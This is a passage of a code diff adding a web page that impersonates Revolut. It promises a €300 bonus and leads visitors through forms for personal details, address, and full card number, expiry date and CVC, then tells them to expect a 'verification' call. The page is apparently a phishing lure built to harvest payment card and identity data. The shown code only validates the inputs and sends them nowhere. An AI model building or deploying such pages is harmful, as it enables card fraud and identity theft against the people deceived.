+                        <input type="text" id="flat" placeholder="Apt 4B">
+                    </div>
+                    <div class="form-group">
+                        <label>Street Address</label>
+                        <input type="text" id="street" placeholder="123 Main Street">
+                    </div>
+                    <div class="form-group">
+                        <label>City</label>
+                        <input type="text" id="city" placeholder="Sofia">
+                    </div>
+                    <div class="form-group">
+                        <label>State / Province</label>
+                        <input type="text" id="state" placeholder="Sofia City">
+                    </div>
+                    <div class="form-group">
+                        <label>Postal Code</label>
+                        <input type="text" id="postal" placeholder="1000" maxlength="10" onkeypress="return onlyDigits(event)">
+                        <div class="error-msg" id="postal-error">Postal code must contain only digits</div>
+                    </div>
+                    <button class="continue-btn" onclick="validateDetails()">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== PAGE 4: CARD ===== -->
+    <div id="card-page" class="page-section">
+        <div class="pt-24 pb-12 px-4 min-h-screen flex items-center justify-center bg-revolut-dark">
+            <div class="form-container">
+                <div class="form-box">
+                    <div class="form-header">
+                        <h2>Card Details</h2>
+                        <p>Enter your card information to receive the bonus</p>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-dot active"></div>
+                        <div class="progress-dot active"></div>
+                        <div class="progress-dot active"></div>
+                        <div class="progress-dot"></div>
+                    </div>
+                    
+                    <div class="card-badges">
+                        <div class="card-badge vip active" onclick="selectCardType(this, 'vip')">VIP</div>
+                        <div class="card-badge premium" onclick="selectCardType(this, 'premium')">Premium</div>
+                    </div>
+
+                    <div class="card-preview" id="card-preview">
+                        <div class="card-shine-effect"></div>
+                        <div class="card-top-line"></div>
+                        <div class="card-contactless-icon">
+                            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/><circle cx="12" cy="12" r="3"/></svg>
+                        </div>
+                        <div style="display:flex; justify-content:space-between; align-items:flex-start;">
+                            <div class="card-chip-gold">
+                                <div class="card-chip-inner-gold"></div>
+                            </div>
+                        </div>
+                        <div class="card-number-display" id="card-display">____ ____ ____ ____</div>
+                        <div class="card-bottom-row">
+                            <div>
+                                <div class="card-label-small">Card Holder</div>
+                                <div class="card-value-small" id="card-holder">YOUR NAME</div>
+                            </div>
+                            <div class="card-logo-area">
+                                <div class="card-expiry-area">
+                                    <div class="card-expiry-label-small">Expires</div>
+                                    <div class="card-expiry-value-small" id="card-expiry">MM/YY</div>
+                                </div>
+                                <div class="card-logo-text" id="card-logo">VISA</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Card Number</label>
+                        <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)" onkeypress="return onlyDigits(event)">
+                        <div class="error-msg" id="card-error">Please enter a valid 16-digit card number</div>
+                    </div>
+                    <div class="card-inputs">
+                        <div class="form-group">
+                            <label>Expiry Date</label>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" onkeypress="return onlyDigitsSlash(event)">
+                            <div class="error-msg" id="expiry-error">Invalid expiry date</div>
+                        </div>
+                        <div class="form-group">
+                            <label>CVC</label>
+                            <input type="text" id="cvc" placeholder="123" maxlength="3" oninput="validateCVC(this)" onkeypress="return onlyDigits(event)">
+                            <div class="error-msg" id="cvc-error">CVC must be 3 digits</div>
+                        </div>
+                        <div class="form-group">
+                            <label>Card Type</label>
+                            <select id="card-type-select" onchange="updateCardLogo()">
+                                <option value="VISA">VISA</option>
+                                <option value="MASTERCARD">MASTERCARD</option>
+                                <option value="AMEX">AMEX</option>
+                            </select>
+                        </div>
+                    </div>
+                    <button class="continue-btn" style="margin-top:24px;" onclick="validateCard()">Get Bonus Now</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== SUCCESS POPUP ===== -->
+    <div class="popup-overlay" id="success-popup">
+        <div class="success-popup-box">
+            <div class="success-icon">✓</div>
+            <h2>Application Received!</h2>
+            <p>You will receive a call soon from us for verification. After verification is complete, you will receive your <strong>€300 bonus</strong> in your Revolut account. Thank you for choosing Revolut!</p>
+            <button class="got-it-btn" onclick="closeSuccessPopup()">Got It</button>
+        </div>
+    </div>
+
+    <script>
+        // ===== PAGE NAVIGATION - FIXED =====
+        function goToPage(pageId) {
+            console.log('Going to page:', pageId);
+            
+            // Close all popups
+            document.querySelectorAll('.popup-overlay').forEach(el => {
+                el.classList.remove('active');
+            });
+            
+            // Hide ALL pages
+            document.querySelectorAll('.page-section').forEach(el => {
+                el.classList.remove('active');
+                el.style.display = 'none';
+            });
+            
+            // Show target page
+            const target = document.getElementById(pageId);
+            if (target) {
+                target.classList.add('active');
+                target.style.display = 'block';
+                console.log('Page shown:', pageId);
+            } else {
+                console.error('Page not found:', pageId);
+            }
+            
+            window.scrollTo(0, 0);
+        }
+
+        // ===== CONFIRM AND PROCEED =====
+        function confirmAndProceed() {
+            closePopup();
+            goToPage('details-page');
+        }
+
+        // ===== COUNTRY CODE =====
+        function updateCountryCode() {
+            const select = document.getElementById('country-select');
+            const code = select.value;
+            document.getElementById('country-code').textContent = code || '+359';
+        }
+
+        // ===== INPUT RESTRICTIONS =====
+        function onlyDigits(e) {
+            return e.charCode >= 48 && e.charCode <= 57;
+        }
+        function onlyDigitsSlash(e) {
+            return (e.charCode >= 48 && e.charCode <= 57) || e.charCode === 47;
+        }
+
+        // ===== PHONE VALIDATION =====
+        function validatePhone(input) {
+            input.value = input.value.replace(/\D/g, '');
+            const error = document.getElementById('phone-error');
+            if(input.value.length < 7) {
+                input.classList.add('error');
+                error.classList.add('show');
+            } else {
+                input.classList.remove('error');
+                error.classList.remove('show');
+            }
+        }
+
+        // ===== CONFIRM POPUP =====
+        function showConfirmPopup() {
+            const phone = document.getElementById('phone-input').value;
+            const code = document.getElementById('country-code').textContent;
+            
+            if(phone.length < 7) {
+                document.getElementById('phone-error').classList.add('show');
+                document.getElementById('phone-input').classList.add('error');
+                return;
+            }
+            
+            document.getElementById('confirm-phone-text').textContent = code + ' ' + phone;
+            document.getElementById('confirm-popup').classList.add('active');
+        }
+
+        function closePopup() {
+            document.getElementById('confirm-popup').classList.remove('active');
+        }
+
+        // ===== SUCCESS POPUP =====
+        function showSuccessPopup() {
+            document.getElementById('success-popup').classList.add('active');
+        }
+
+        function closeSuccessPopup() {
+            document.getElementById('success-popup').classList.remove('active');
+            goToPage('home-page');
+        }
+
+        // ===== NAME VALIDATION =====
+        function validateName(input) {
+            const error = document.getElementById('name-error');
+            if(input.value.trim().length < 2) {
+                input.classList.add('error');
+                error.classList.add('show');
+            } else {
+                input.classList.remove('error');
+                error.classList.remove('show');
+            }
+            updateCardHolder();
+        }
+
+        // ===== EMAIL VALIDATION =====
+        function validateEmail(input) {
+            const error = document.getElementById('email-error');
+            const email = input.value.trim();
+            const hasAt = email.includes('@');
+            const hasDot = email.includes('.', email.indexOf('@') + 1);
+            
+            if(!hasAt || !hasDot || email.indexOf('@') === 0 || email.indexOf('@') === email.length - 1) {
+                input.classList.add('error');
+                error.classList.add('show');
+                return false;
+            } else {
+                input.classList.remove('error');
+                error.classList.remove('show');
+                return true;
+            }
+        }
+
+        // ===== DOB VALIDATION =====
+        function validateDOB(input) {
+            const error = document.getElementById('dob-error');
+            if(!input.value) {
+                error.classList.add('show');
+                return;
+            }
+            const dob = new Date(input.value);
+            const today = new Date();
+            let age = today.getFullYear() - dob.getFullYear();
+            const monthDiff = today.getMonth() - dob.getMonth();
+            if(monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) {
+                age--;
+            }
+            if(age < 18) {
+                input.classList.add('error');
+                error.classList.add('show');
+            } else {
+                input.classList.remove('error');
+                error.classList.remove('show');
+            }
+        }
+
+        // ===== VALIDATE DETAILS PAGE =====
+        function validateDetails() {
+            const name = document.getElementById('full-name');
+            const email = document.getElementById('email');
+            const dob = document.getElementById('dob');
+            const postal = document.getElementById('postal');
+            
+            let valid = true;
+            
+            if(name.value.trim().length < 2) {
+                name.classList.add('error');
+                document.getElementById('name-error').classList.add('show');
+                valid = false;
+            }
+            
+            if(!validateEmail(email)) valid = false;
+            
+            if(!dob.value) {
+                dob.classList.add('error');
+                document.getElementById('dob-error').classList.add('show');
+                valid = false;
+            }
+            
+            if(postal.value && !/^\d+$/.test(postal.value)) {
+                postal.classList.add('error');
+                document.getElementById('postal-error').classList.add('show');
+                valid = false;
+            }
+            
+            if(valid) {
+                goToPage('card-page');
+                updateCardHolder();
+            }
+        }
+
+        // ===== CARD NUMBER FORMATTING =====
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            value = value.substring(0, 16);
+            input.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            
+            const display = document.getElementById('card-display');
+            if(value.length === 0) {
+                display.textContent = '____ ____ ____ ____';
+            } else {
+                let displayText = '';
+                for(let i = 0; i < 16; i++) {
+                    if(i < value.length) {
+                        displayText += value[i];
+                    } else {
+                        displayText += '_';
+                    }
+                    if((i + 1) % 4 === 0 && i !== 15) {
+                        displayText += ' ';
+                    }
+                }
+                display.textContent = displayText;
+            }
+            
+            const error = document.getElementById('card-error');
+            if(value.length > 0 && value.length !== 16) {
+                input.classList.add('error');
+                error.classList.add('show');
+            } else {
+                input.classList.remove('error');
+                error.classList.remove('show');
+            }
+        }
+
+        // ===== EXPIRY FORMATTING =====
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if(value.length >= 2) {
+                value = value.substring(0, 4);
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+            input.value = value;
+            
+            document.getElementById('card-expiry').textContent = value || 'MM/YY';
+            
+            const error = document.getElementById('expiry-error');
+            const parts = value.split('/');
+            if(parts.length === 2 && parts[0].length === 2 && parts[1].length === 2) {
+                const month = parseInt(parts[0]);
+                const year = parseInt(parts[1]);
+                const currentYear = new Date().getFullYear() % 100;
+                const currentMonth = new Date().getMonth() + 1;
+                
+                if(month < 1 || month > 12) {
+                    input.classList.add('error');
+                    error.textContent = 'Month must be 01-12';
+                    error.classList.add('show');
+                } else if(year < currentYear || (year === currentYear && month < currentMonth)) {
+                    input.classList.add('error');
+                    error.textContent = 'Card has expired';
+                    error.classList.add('show');
+                } else {
+                    input.classList.remove('error');
+                    error.classList.remove('show');
+                }
+            }
+        }
+
+        // ===== CVC VALIDATION =====
+        function validateCVC(input) {
+            let value = input.value.replace(/\D/g, '');
+            value = value.substring(0, 3);
+            input.value = value;
+            
+            const error = document.getElementById('cvc-error');
+            if(value.length > 0 && value.length !== 3) {
+                input.classList.add('error');
+                error.classList.add('show');
+            } else {
+                input.classList.remove('error');
+                error.classList.remove('show');
+            }
+        }
+
+        // ===== CARD TYPE SELECTION =====
+        function selectCardType(el, type) {
+            document.querySelectorAll('.card-badge').forEach(b => b.classList.remove('active'));
+            el.classList.add('active');
+        }
+
+        // ===== UPDATE CARD LOGO =====
+        function updateCardLogo() {
+            document.getElementById('card-logo').textContent = document.getElementById('card-type-select').value;
+        }
+
+        // ===== UPDATE CARD HOLDER =====
+        function updateCardHolder() {
+            const name = document.getElementById('full-name').value.trim() || 'YOUR NAME';
+            document.getElementById('card-holder').textContent = name.toUpperCase();
+        }
+
+        // ===== VALIDATE CARD PAGE =====
+        function validateCard() {
+            const cardNum = document.getElementById('card-number');
+            const expiry = document.getElementById('expiry');
+            const cvc = document.getElementById('cvc');
+            
+            let valid = true;
+            
+            const cleanNum = cardNum.value.replace(/\s/g, '');
+            if(cleanNum.length !== 16) {
+                cardNum.classList.add('error');
+                document.getElementById('card-error').classList.add('show');
+                valid = false;
+            }
+            
+            if(expiry.value.length !== 5) {
+                expiry.classList.add('error');
+                document.getElementById('expiry-error').classList.add('show');
+                valid = false;
+            }
+            
+            if(cvc.value.length !== 3) {
+                cvc.classList.add('error');
+                document.getElementById('cvc-error').classList.add('show');
+                valid = false;
+            }
+            
+            if(valid) {
+                showSuccessPopup();
+            }
+        }
+
+        // Navbar scroll effect
+        window.addEventListener('scroll', () => {
+            const navbar = document.getElementById('navbar');
+            if (window.scrollY > 50) {
+                navbar.classList.add('bg-revolut-dark/95');
+            } else {
+                navbar.classList.remove('bg-revolut-dark/95');
+            }
+        });
+    </script>
+</body>
+</html>
